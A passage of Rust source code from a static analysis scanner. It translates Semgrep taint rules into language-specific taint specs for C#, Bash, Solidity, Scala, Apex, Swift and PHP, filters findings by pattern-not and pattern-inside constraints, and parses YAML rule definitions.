        } => csharp_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => csharp_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => csharp_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the C# engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            csharp_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => csharp_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            csharp_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => csharp_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Bash taint spec.
fn to_bash_spec(g: &GenericSpec) -> bash_taint::TaintSpec {
    bash_taint::TaintSpec {
        sources: g.sources.iter().map(to_bash_matcher).collect(),
        sinks: g.sinks.iter().map(to_bash_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_bash_matcher).collect(),
    }
}

fn to_bash_matcher(m: &GenericMatcher) -> bash_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => bash_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => bash_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => bash_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => bash_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => bash_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            bash_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => bash_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => bash_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => bash_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            bash_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => bash_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            bash_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => bash_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Solidity taint spec.
fn to_solidity_spec(g: &GenericSpec) -> solidity_taint::TaintSpec {
    solidity_taint::TaintSpec {
        sources: g.sources.iter().map(to_solidity_matcher).collect(),
        sinks: g.sinks.iter().map(to_solidity_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_solidity_matcher).collect(),
    }
}

fn to_solidity_matcher(m: &GenericMatcher) -> solidity_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => solidity_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => solidity_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => {
            solidity_taint::NodeMatcher::ParamName {
                names: names.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodName {
            method,
            description,
        } => solidity_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => {
            solidity_taint::NodeMatcher::CallRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodNameRegex { regex, description } => {
            solidity_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => solidity_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => {
            solidity_taint::NodeMatcher::FieldName {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::Subscript { base, description } => solidity_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            solidity_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => solidity_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            solidity_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => solidity_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Scala taint spec.
fn to_scala_spec(g: &GenericSpec) -> scala_taint::TaintSpec {
    scala_taint::TaintSpec {
        sources: g.sources.iter().map(to_scala_matcher).collect(),
        sinks: g.sinks.iter().map(to_scala_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_scala_matcher).collect(),
    }
}

fn to_scala_matcher(m: &GenericMatcher) -> scala_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => scala_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => scala_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => scala_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => scala_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => scala_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            scala_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => scala_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => scala_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => scala_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            scala_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => scala_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            scala_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => scala_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into an Apex taint spec.
fn to_apex_spec(g: &GenericSpec) -> apex_taint::TaintSpec {
    apex_taint::TaintSpec {
        sources: g.sources.iter().map(to_apex_matcher).collect(),
        sinks: g.sinks.iter().map(to_apex_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_apex_matcher).collect(),
    }
}

fn to_apex_matcher(m: &GenericMatcher) -> apex_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => apex_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => apex_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => apex_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => apex_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => apex_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            apex_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => apex_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => apex_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => apex_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            apex_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => apex_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            apex_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => apex_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Swift taint spec.
fn to_swift_spec(g: &GenericSpec) -> swift_taint::TaintSpec {
    swift_taint::TaintSpec {
        sources: g.sources.iter().map(to_swift_matcher).collect(),
        sinks: g.sinks.iter().map(to_swift_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_swift_matcher).collect(),
    }
}

fn to_swift_matcher(m: &GenericMatcher) -> swift_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => swift_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => swift_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => swift_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => swift_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => swift_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            swift_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => swift_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => swift_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => swift_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            swift_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => swift_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            swift_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => swift_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

fn to_php_matcher(m: &GenericMatcher) -> php_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => php_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => php_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => php_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => php_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => php_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            php_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => php_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => php_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => php_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the PHP engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            php_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => php_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            php_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => php_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// A compiled Semgrep `mode: taint` rule.
pub struct SemgrepTaintRule {
    pub id: String,
    pub message: String,
    pub severity: Severity,
    pub cwe: Option<String>,
    pub lang: Language,
    spec: GenericSpec,
    /// Compiled `pattern-not` constraints, partitioned by role. The
    /// post-filter in [`SemgrepTaintRule::check_with_context`] enforces
    /// the sink-side negatives against each finding's sink node.
    negatives: TaintNegatives,
    /// Compiled `pattern-inside` constraints, partitioned by role. The
    /// post-filter enforces the sink-side insides against each finding's
    /// sink node: a finding is kept only if its sink is inside one of them.
    insides: TaintInsides,
}

/// Unified view over the three engine-specific `TaintFinding` types.
struct TaintFindingView {
    sink_start_byte: usize,
    sink_end_byte: usize,
    sink_line: usize,
    sink_column: usize,
    sink_end_line: usize,
    sink_end_column: usize,
    source_description: String,
    sink_description: String,
    source_line: usize,
    hops: u8,
}

impl TaintFindingView {
    fn from_python(f: python_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_js(f: javascript_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_go(f: go_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_java(f: java_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_c(f: c_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_kotlin(f: kotlin_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_ruby(f: ruby_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_php(f: php_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_csharp(f: csharp_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_bash(f: bash_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_solidity(f: solidity_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_scala(f: scala_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_apex(f: apex_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
    fn from_swift(f: swift_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            hops: f.hops,
        }
    }
}

impl Rule for SemgrepTaintRule {
    fn id(&self) -> &str {
        &self.id
    }
    fn severity(&self) -> Severity {
        self.severity
    }
    fn cwe(&self) -> Option<&str> {
        self.cwe.as_deref()
    }
    fn description(&self) -> &str {
        &self.message
    }
    fn language(&self) -> Language {
        self.lang
    }

    fn check(&self, source: &str, tree: &tree_sitter::Tree) -> Vec<Finding> {
        self.check_with_context(source, tree, &FileContext::default())
    }

    fn ast_analysis_requirement(&self) -> crate::rules::AstAnalysisRequirement {
        crate::rules::AstAnalysisRequirement::FileContext
    }

    fn check_with_context(
        &self,
        source: &str,
        tree: &tree_sitter::Tree,
        ctx: &FileContext<'_>,
    ) -> Vec<Finding> {
        // Dispatch to the appropriate taint engine based on the rule's
        // target language. Each engine returns the same TaintFinding shape.
        let mut raw: Vec<TaintFindingView> = match self.lang {
            Language::Python => {
                let spec = to_python_spec(&self.spec);
                python_taint::analyze_tree(tree.root_node(), source, &spec, ctx.python_aliases)
                    .into_iter()
                    .map(TaintFindingView::from_python)
                    .collect()
            }
            Language::JavaScript => {
                let spec = to_js_spec(&self.spec);
                javascript_taint::analyze_tree(
                    tree.root_node(),
                    source,
                    &spec,
                    ctx.javascript_aliases,
                )
                .into_iter()
                .map(TaintFindingView::from_js)
                .collect()
            }
            Language::Go => {
                let spec = to_go_spec(&self.spec);
                go_taint::analyze_tree(tree.root_node(), source, &spec, ctx.go_aliases)
                    .into_iter()
                    .map(TaintFindingView::from_go)
                    .collect()
            }
            Language::Java => {
                let spec = to_java_spec(&self.spec);
                java_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_java)
                    .collect()
            }
            Language::C => {
                let spec = to_c_spec(&self.spec);
                c_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_c)
                    .collect()
            }
            Language::Kotlin => {
                let spec = to_kotlin_spec(&self.spec);
                kotlin_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_kotlin)
                    .collect()
            }
            Language::Ruby => {
                let spec = to_ruby_spec(&self.spec);
                ruby_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_ruby)
                    .collect()
            }
            Language::Php => {
                let spec = to_php_spec(&self.spec);
                php_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_php)
                    .collect()
            }
            Language::CSharp => {
                let spec = to_csharp_spec(&self.spec);
                csharp_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_csharp)
                    .collect()
            }
            Language::Bash => {
                let spec = to_bash_spec(&self.spec);
                bash_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_bash)
                    .collect()
            }
            Language::Solidity => {
                let spec = to_solidity_spec(&self.spec);
                solidity_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_solidity)
                    .collect()
            }
            Language::Scala => {
                let spec = to_scala_spec(&self.spec);
                scala_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_scala)
                    .collect()
            }
            Language::Apex => {
                let spec = to_apex_spec(&self.spec);
                apex_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_apex)
                    .collect()
            }
            Language::Swift => {
                let spec = to_swift_spec(&self.spec);
                swift_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_swift)
                    .collect()
            }
            _ => Vec::new(),
        };
        // ── Post-filter: enforce sink-side `pattern-not` constraints ────
        //
        // `compile_patterns_block` captured each `pattern-not` inside a
        // `pattern-sinks` `patterns:` AND-block into `self.negatives.sink`.
        // A finding whose sink node's byte range is matched by any such
        // negative pattern is suppressed — this is the Semgrep AND
        // semantics that were previously dropped, broadening the matcher
        // and causing false positives.
        //
        // Source-side `pattern-not` is compiled but not enforced here:
        // findings carry no source byte range, so we cannot precisely test
        // the source node (deferred — see COMPATIBILITY.md).
        if !self.negatives.sink.is_empty() {
            let root = tree.root_node();
            raw.retain(|t| {
                !self
                    .negatives
                    .sink
                    .iter()
                    .any(|neg| neg.overlaps_range(root, source, t.sink_start_byte, t.sink_end_byte))
            });
        }
        // ── Post-filter: enforce sink-side `pattern-inside` constraints ─────
        //
        // `compile_patterns_block` captured each `pattern-inside` inside a
        // `pattern-sinks` `patterns:` AND-block into `self.insides.sink`.
        // These express "the sink must appear textually INSIDE this region"
        // (e.g. inside a particular handler/function). A finding is kept only
        // when its sink node's byte range is *contained* by a region matched
        // by at least one such `pattern-inside`; otherwise it is suppressed.
        // This is the INVERSE of the `pattern-not` filter above (pattern-not
        // suppresses when inside; pattern-inside suppresses when NOT inside)
        // and restores the Semgrep AND semantics that were previously dropped
        // (the matcher fired everywhere instead of only inside the region).
        //
        // Source-side `pattern-inside` is compiled but not enforced here:
        // findings carry no source byte range, so we cannot test the source
        // node's containment (deferred — same limitation as source-side
        // `pattern-not`).
        if !self.insides.sink.is_empty() {
            let root = tree.root_node();
            raw.retain(|t| {
                self.insides.sink.iter().any(|inside| {
                    inside.contains_range(root, source, t.sink_start_byte, t.sink_end_byte)
                })
            });
        }
        raw.into_iter()
            .map(|t| Finding {
                rule_id: self.id.clone(),
                severity: self.severity,
                cwe: self.cwe.clone(),
                description: format!(
                    "{} — {} reaches {}",
                    self.message, t.source_description, t.sink_description
                ),
                file: String::new(),
                line: t.sink_line,
                column: t.sink_column,
                end_line: t.sink_end_line,
                end_column: t.sink_end_column,
                snippet: get_source_line(source, t.sink_start_byte),
                source_line: Some(t.source_line),
                source_description: Some(t.source_description),
                sink_line: Some(t.sink_line),
                sink_description: Some(t.sink_description),
                fix_suggestion: None,
                sink_start_byte: None,
                sink_end_byte: None,
                confidence: crate::rules::common::confidence_for_hops(t.hops),
                taint_hops: Some(t.hops),
                tags: vec![],
                crypto_algorithm: None,
                cnsa2_deadline: None,
                dep_name: None,
                dep_version: None,
                dep_ecosystem: None,
                dep_purl: None,
                dep_vulnerability_id: None,
                dep_fixed_version: None,
                dep_source: None,
                dep_vulnerability_severity: None,
                dep_path: vec![],
            })
            .collect()
    }
}

// ─── YAML → TaintSpec compilation ─────────────────────────────────────────

/// Outcome of trying to parse a single YAML rule as a taint rule.
pub enum TaintRuleParse {
    /// The rule is `mode: taint` and was compiled successfully.
    Compiled(SemgrepTaintRule),
    /// The rule is `mode: taint` but we could not compile it (bad language,
    /// unsupported pattern syntax, missing required sections, …). The caller
    /// should surface the warning and skip the rule.
    Skip(String),
    /// The rule is *not* `mode: taint`. The caller should fall through to
    /// its existing pattern-rule handling path.
    NotTaint,
}

/// Attempt to parse a single Semgrep YAML rule as a `mode: taint` rule.
///
/// Returns [`TaintRuleParse::NotTaint`] when the rule does not declare
/// `mode: taint`, so the caller can keep running its normal pattern-rule
/// compilation without an early exit.
pub fn parse_taint_rule(yaml: &YamlValue) -> TaintRuleParse {
    // Only engage for rules that explicitly declare `mode: taint`.
    let mode = yaml.get("mode").and_then(YamlValue::as_str);
    if mode != Some("taint") {
        return TaintRuleParse::NotTaint;
    }

    let id = match yaml.get("id").and_then(YamlValue::as_str) {
        Some(s) => s.to_string(),
        None => return TaintRuleParse::Skip("taint rule missing `id`".into()),
    };

    // Determine the target language. We support Python, JavaScript/TypeScript,
    // Go, Java, C, and Kotlin. The first recognised language wins.
    let lang = match yaml.get("languages").and_then(YamlValue::as_sequence) {
        Some(langs) => {
            let mut detected: Option<Language> = None;
            for s in langs.iter().filter_map(YamlValue::as_str) {
                match s.to_lowercase().as_str() {
                    "python" | "py" => {
                        detected = Some(Language::Python);
                        break;
                    }
                    "javascript" | "js" | "typescript" | "ts" => {
                        detected = Some(Language::JavaScript);
                        break;
                    }
                    "go" | "golang" => {
                        detected = Some(Language::Go);
                        break;
                    }
                    "java" => {
                        detected = Some(Language::Java);
                        break;
                    }
                    "c" => {
                        detected = Some(Language::C);
                        break;
                    }
                    "kotlin" | "kt" => {
                        detected = Some(Language::Kotlin);
                        break;
                    }
                    "ruby" | "rb" => {
                        detected = Some(Language::Ruby);
                        break;
                    }
                    "php" => {
                        detected = Some(Language::Php);
                        break;
                    }
                    "csharp" | "cs" | "c#" => {
                        detected = Some(Language::CSharp);
                        break;
                    }
                    "bash" | "sh" | "shell" => {
                        detected = Some(Language::Bash);
                        break;
                    }
                    "solidity" | "sol" => {
                        detected = Some(Language::Solidity);
                        break;
                    }
                    "scala" => {
                        detected = Some(Language::Scala);
                        break;
                    }
                    "apex" => {
                        detected = Some(Language::Apex);
                        break;
                    }
                    "swift" => {
                        detected = Some(Language::Swift);
                        break;
                    }
                    _ => {}
                }
            }
            match detected {
                Some(l) => l,
                None => {
                    return TaintRuleParse::Skip(format!(
                        "taint rule `{}` targets unsupported languages; Python, JavaScript/TypeScript, Go, Java, C, Kotlin, Ruby, PHP, C#, Bash, Solidity, Scala, Apex, and Swift are supported",
                        id
                    ));
                }
            }
        }
        None => return TaintRuleParse::Skip(format!("taint rule `{}` missing `languages`", id)),
    };

    let message = yaml
        .get("message")
        .and_then(YamlValue::as_str)
        .unwrap_or("")
        .to_string();

    let severity_str = yaml
        .get("severity")
        .and_then(YamlValue::as_str)
        .unwrap_or("WARNING");
    let severity = map_severity(severity_str);

    let cwe = extract_cwe(yaml);

    // ── Compile sources ────────────────────────────────────────────────
    let (sources, source_neg_strings, source_inside_strings) =
        match compile_matcher_list(yaml.get("pattern-sources"), MatcherRole::Source, &id, lang) {
            Ok(v) => v,
